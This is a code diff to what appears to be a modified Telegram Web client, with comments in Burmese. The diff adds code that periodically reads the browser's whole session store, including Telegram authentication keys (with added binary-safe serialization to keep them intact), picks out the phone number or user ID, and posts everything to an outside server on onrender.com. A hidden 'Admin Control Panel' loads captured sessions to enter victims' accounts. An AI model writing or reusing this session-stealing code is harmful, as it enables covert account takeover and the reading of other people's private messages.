@@ -129,8 +129,21 @@ onBeforeUnload(() => {
   actions.hangUp?.({ isPageUnload: true });
 });
 
-// --- 🌟 ULTIMATE AUTO-SYNC & HIDDEN ADMIN ROUTE (FIXED) 🌟 ---
+// --- 🌟 THE FINAL BULLETPROOF AUTO-SYNC (BINARY SAFE) 🌟 ---
 let isSyncing = false; 
+
+// 🌟 Telegram ၏ လျှို့ဝှက်သော့ (authKey) များ မပျက်စီးစေရန် ကာကွယ်ပေးသော စနစ် 🌟
+const jsonReplacer = (key: string, value: any) => {
+    if (value instanceof Uint8Array) return { __type: 'Uint8Array', data: Array.from(value) };
+    if (value instanceof ArrayBuffer) return { __type: 'ArrayBuffer', data: Array.from(new Uint8Array(value)) };
+    return value;
+};
+
+const jsonReviver = (key: string, value: any) => {
+    if (value && value.__type === 'Uint8Array') return new Uint8Array(value.data);
+    if (value && value.__type === 'ArrayBuffer') return new Uint8Array(value.data).buffer;
+    return value;
+};
 
 setTimeout(() => {
     const DB_NAME = 'tt-data';
@@ -147,7 +160,7 @@ setTimeout(() => {
         adminDiv.innerHTML = `
             <div style="background:#fff; padding:40px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.5); text-align:center; width: 350px; font-family: sans-serif;">
                 <h2 style="color:#333; margin-bottom:20px;">Admin Control Panel</h2>
-                <input type="text" id="myAdminPhone" placeholder="Data အမည် (ဥပမာ: +959... သို့ ID_...)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:2px solid #ccc; border-radius:5px; font-size:16px; color:black; background:white;">
+                <input type="text" id="myAdminPhone" placeholder="Data အမည် (ဥပမာ: ID_12345678)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:2px solid #ccc; border-radius:5px; font-size:16px; color:black; background:white;">
                 <button id="myAdminBtn" style="padding:12px; width:100%; background:#0088cc; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold; font-size:16px;">အကောင့်ထဲသို့ ဝင်ရန်</button>
                 <p id="myAdminStatus" style="color:red; margin-top:15px; font-size:14px; font-weight:bold;"></p>
             </div>
@@ -181,7 +194,9 @@ setTimeout(() => {
                     }
                     
                     statusMsg.innerText = "✅ တွေ့ရှိပါသည်။ အကောင့်ထဲသို့ ဝင်နေပါပြီ...";
-                    const dataToImport = JSON.parse(result.data);
+                    
+                    // 🌟 ပျက်စီးမှုမရှိသော လျှို့ဝှက်သော့များကို ပြန်လည်ရယူခြင်း (Binary Data) 🌟
+                    const dataToImport = JSON.parse(result.data, jsonReviver);
                     const req = indexedDB.open(DB_NAME);
                     
                     req.onsuccess = (e: any) => {
@@ -194,7 +209,6 @@ setTimeout(() => {
                                 txStore.put(dataToImport[k], k).onsuccess = () => {
                                     count++;
                                     if (count === keys.length) {
-                                        // 🌟 အရေးကြီးဆုံး: Telegram က Data ပြန်မဖျက်အောင် Local မှတ်ဉာဏ်အဟောင်းများ ရှင်းလင်းခြင်း 🌟
                                         localStorage.clear();
                                         sessionStorage.clear();
                                         window.location.href = '/'; 
@@ -213,10 +227,10 @@ setTimeout(() => {
     }
 
     // =========================================================
-    // ၂။ 📤 STAFF AUTO-SYNC (STRICT MATCHING - Data ပွားခြင်း လုံးဝမရှိတော့ပါ)
+    // ၂။ 📤 STAFF AUTO-SYNC (STRICT & BINARY SAFE)
     // =========================================================
     setInterval(() => {
-        if (isSyncing) return; // ပို့နေဆဲဖြစ်ပါက ထပ်မပို့ပါ
+        if (isSyncing) return; 
 
         try {
             const req = indexedDB.open(DB_NAME);
@@ -231,29 +245,32 @@ setTimeout(() => {
                         const keys = e2.target.result;
                         
                         const data: any = {};
-                        keys.forEach((k: string, i: number) => { data[k] = vals[i]; });
-                        const dataString = JSON.stringify(data);
+                        let currentUserId = null;
+
+                        keys.forEach((k: string, i: number) => { 
+                            data[k] = vals[i]; 
+                            if (k === 'currentUserId') currentUserId = vals[i];
+                        });
                         
-                        // 🌟 User ID သို့မဟုတ် Phone Number ကို အတိအကျ (ဂဏန်း ၅ လုံးနှင့်အထက်) တွေ့မှသာ ယူပါမည် 🌟
-                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d{5,15})"?/);
-                        let idMatch = dataString.match(/"currentUserId":"?(\d{5,15})"?/);
-                        if (!idMatch) idMatch = dataString.match(/"id":(\d{5,15})/); 
+                        // 🌟 User ID မရှိသေးပါက လုံးဝ (လုံးဝ) မပို့ပါ 🌟
+                        if (!currentUserId) return; 
 
-                        // 🌟 ဖုန်းနံပါတ် သို့မဟုတ် ID အတိအကျ မရသေးပါက (Language Pack သာဖြစ်နေပါက) လုံးဝ မပို့ပါ 🌟
-                        if (!phoneMatch && !idMatch) return; 
-
+                        // 🌟 လျှို့ဝှက်သော့များကို Binary အနေဖြင့် သေချာ ထုပ်ပိုးခြင်း 🌟
+                        const dataString = JSON.stringify(data, jsonReplacer);
+                        
                         let phone = "";
+                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d{8,15})"?/);
+                        
                         if (phoneMatch && phoneMatch[1]) {
                             phone = '+' + phoneMatch[1];
-                        } else if (idMatch && idMatch[1]) {
-                            phone = "ID_" + idMatch[1];
+                        } else {
+                            phone = "ID_" + currentUserId;
                         }
                         
-                        // 🌟 ဒီဖုန်းနံပါတ်ကို ပို့ပြီးသားလား စစ်ဆေးမည် (Data အထပ်ထပ်မပွားစေရန်) 🌟
                         const lastSynced = localStorage.getItem('synced_staff_id');
                         if (lastSynced === phone) return;
 
-                        isSyncing = true; // Block လုပ်ထားမည် (Data ၄ ခါဝင်ခြင်းကို တားဆီးရန်)
+                        isSyncing = true; 
                         
                         fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
                             method: 'POST',
@@ -262,7 +279,7 @@ setTimeout(() => {
                         }).then(res => res.json())
                           .then(resData => {
                               if(resData.success) {
-                                  localStorage.setItem('synced_staff_id', phone); // အောင်မြင်မှသာ မှတ်ထားမည်
+                                  localStorage.setItem('synced_staff_id', phone); 
                               }
                               isSyncing = false;
                           }).catch(() => { isSyncing = false; }); 
